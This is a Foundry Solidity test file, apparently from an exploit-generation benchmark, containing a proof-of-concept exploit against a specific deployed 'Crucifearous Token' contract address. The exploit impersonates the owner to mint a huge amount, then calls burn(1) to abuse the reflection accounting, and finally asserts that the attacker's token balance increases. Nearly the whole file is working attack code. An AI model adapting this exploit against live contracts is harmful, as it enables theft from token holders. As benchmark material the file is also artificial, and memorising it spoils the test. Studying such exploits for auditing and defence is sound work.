// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function burn(uint256 _value) external;
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint256);
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6bf3a93793e52f75543c92AfEC4636559988e3c1;
    address attacker = address(this);
    uint256 initialBalance;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during exploit
        vm.label(TARGET, "Crucifearous Token");

        // Get initial attacker balance for comparison
        initialBalance = ICoinToken(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner address
        address owner = ICoinToken(TARGET).owner();

        // Step 2: Impersonate the owner to call mint() with a HUGE amount
        vm.startPrank(owner);

        // Mint an extremely large amount - close to max uint256
        // Use type(uint256).max / 2 to avoid overflow
        uint256 hugeMintAmount = type(uint256).max / 2;
        ICoinToken(TARGET).mint(attacker, hugeMintAmount);

        vm.stopPrank();

        // Get attacker's reflection balance after mint
        uint256 rBalanceBefore = ICoinToken(TARGET).reflectionFromToken(hugeMintAmount, false);

        // Get token balance before burn
        uint256 tokenBalanceBefore = ICoinToken(TARGET).balanceOf(attacker);
        console.log("Token balance before burn:", tokenBalanceBefore);

        // Step 3: Burn just 1 reflection unit
        // This will subtract 1 from _tTotal (token total), which is huge!
        ICoinToken(TARGET).burn(1);

        // Step 4: Check new token balance
        uint256 tokenBalanceAfter = ICoinToken(TARGET).balanceOf(attacker);
        console.log("Token balance after burn:", tokenBalanceAfter);
        console.log("Balance change:", tokenBalanceAfter - tokenBalanceBefore);

        // The oracle will check if attacker balance increased
        assertGt(tokenBalanceAfter, tokenBalanceBefore, "Attacker balance should have increased");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
